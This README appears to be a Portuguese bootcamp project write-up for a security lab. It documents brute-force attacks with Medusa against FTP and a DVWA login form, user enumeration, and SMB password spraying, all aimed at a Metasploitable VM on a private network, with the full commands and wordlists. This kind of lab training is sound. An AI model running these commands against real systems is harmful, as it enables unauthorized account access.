# DIO\_Projeto\_BootCamp

Entrega do Projeto do Bootcamp de Segurança Santander na DIO



Automação em tentativas de brute force em FTP e formulários DVWA e password spraying em SMB com enumeração de usuários.



Abaixo seguem as wordlists, comandos e validações de acessos das credenciais identificadas.



Utilizei o script do Linux para salvar os comandos executados no bash. Tudo está disponível no arquivo DIO\_Bootcamp\_Santander\_Log.txt, na pasta Evidências.



Nesta mesma pasta estão os arquivos txt com as senhas e usuários, conforme testes e vídeos. Também existem prints do formulário e acessos após o password spraying.







IP VM Meta: 192.168.56.102

IP VM Kali: 192.168.56.101



nmap -sV -p 21,22,80,445,139 192.168.56.102



ftp 192.168.56.102



echo -e "user\\nmsfadmin\\nadmin\\nroot" > users.txt

echo -e "123456\\npassword\\nqwerty\\nmsfadmin" > pass.txt

medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6



medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \\

&nbsp;-m PAGE:'/dvma/login.php' \\

&nbsp;-m FORM:'username=^USER^\&password=^PASS^\&Login=Login' \\

&nbsp;-m 'FAIL=Login failed' -t 6



enumforlinux -a 192.168.56.102 | tee enum4\_output.txt



echo -e "user\\nmsfadmin\\nservice" > smb\_users.txt

echo -e "password\\n123456\\nWelcome123\\nmsfadmin" > senhas\_spray.txt

medusa -h 192.168.56.102 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T 50



smbclient -L //192.168.56.102 -U msfadmin

